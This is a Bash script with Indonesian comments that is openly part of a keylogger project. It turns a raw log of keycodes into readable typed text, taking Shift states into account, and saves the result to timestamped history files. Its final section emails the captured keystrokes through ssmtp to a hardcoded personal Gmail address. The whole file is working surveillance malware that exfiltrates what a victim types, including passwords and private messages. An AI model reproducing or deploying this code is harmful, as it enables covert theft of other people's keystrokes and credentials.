#!/bin/bash

FOLDER="kelompokkucing"
LOGGER="/opt/$FOLDER/logger.txt"
KEYMAPS="/opt/$FOLDER/keymaps.txt"
OUTPUT="/opt/$FOLDER/history/hist_$(date +'%F_%H-%M-%S').txt"


##################################### record log in array
declare -a arr
permis="false"
let a=0
let b=0
for t in $(cat $LOGGER); do

  if [ $permis = "true" ]; then
  #echo $a - $t
  arr[$a]=$t
  ((a++))
  ((b++))
  fi


  if [ $t = "keycode" ]; then 
  permis="true"
  ((b=1))
  fi

  if [ $b = 3 ]; then
  permis="false"
  fi

done

#echo "######"
let counter=0
while [ $counter -lt ${#arr[@]} ]; do
  # echo ${arr[@]:counter:2}
  ((counter+=2))
done
#echo "######"

####################################### catat keymaps
declare -a keymap
let a=0
let word=100
for t in $(cat $KEYMAPS | grep ^keycode); do
  # echo $t
  if [ $word -lt 3 ]; then
    keymap[$a]=$t
    ((a++))
    ((word++))
  fi

  if [ $t = "keycode" ]; then
    ((word=0))
  fi  

done

let counter=0
# echo ${keymap[@]}
while [ $counter -lt ${#keymap[@]} ]; do
  # echo ${keymap[@]:counter:3}
  ((counter+=3))
done

##################################### catat shift keymaps
declare -a shiift
let a=0
let word=100
for sap in $(cat $KEYMAPS | grep -w shift); do
  if [ $word -lt 3 ]
  then
    shiift[$a]=$sap
    ((a++))
    ((word++))
  else
    code="off"
  fi


  if [ $sap = "shift" ]
  then
    atas="on"
  else
    if [ $atas = "on" ]
    then
      if [ $sap = "keycode" ]
      then
        ((word=0))
      else
        atas="off"
      fi 
    fi  
  fi

done

let counter=0
while [ $counter -lt ${#shiift[@]} ]; do
  # echo ${shiift[@]:counter:3}
  ((counter+=3))
done


###################################### pencocokan log dan keymaps
cc=''
len=0
caps="off"
echo $(date +'%F_%H-%M-%S') > $OUTPUT
for (( aa=0;aa<${#arr[@]};aa+=2));do
  # echo ${arr[@]:aa:1} - ${arr[@]:aa+1:1}
  for (( bb=0;bb<${#keymap[@]};bb+=3));do
    if [ ${arr[@]:aa:1} -eq ${keymap[@]:bb:1} ]
    then
      if [ ${arr[@]:aa+1:1} = "press" ]
      then
        if [ ${arr[@]:aa:1} -eq 28 ] #return or enter button
        then
          cc+="(${keymap[@]:bb+2:1})" 
          echo $cc >> $OUTPUT
          cc=''
        else   
          if [ ${arr[@]:aa:1} -eq 42 ] #shift button
          then
            if [ $caps = "off" ]
            then
              caps="on"
            fi
          else
            if [ $caps = "on" ] # jika code shift nyala
            then
              ketemu="off"
              for (( ss=0;ss<${#shiift[@]};ss+=3));do
                if [ ${arr[@]:aa:1} -eq ${shiift[@]:ss:1} ]
                then
                    cc+="(${shiift[@]:ss+2:1})" 
                    ketemu="on"
                fi
              done
              if [ $ketemu = "off" ]
              then
                cc+="(${keymap[@]:bb+2:1})"
              fi
            else
              cc+="(${keymap[@]:bb+2:1})" 
            fi
          fi
        fi
        

      else
        # released section 
        if [ ${arr[@]:aa:1} -eq 42 ]
        then
          # cc+="(${keymap[@]:bb+2:1} release)"
          caps="off"
        fi
      fi
    fi
  done
done
echo $cc >> $OUTPUT
# echo "###########"
# cat $OUTPUT.txt 

#####################kirim email
RECIEVER="luckyrama0@gmail.com"
SUBJECT="Subject: keylogger kelompok kucing"
MAIL="/opt/$FOLDER/mail.txt"
echo $SUBJECT > $MAIL
cat $OUTPUT >> $MAIL
ssmtp $RECIEVER < $MAIL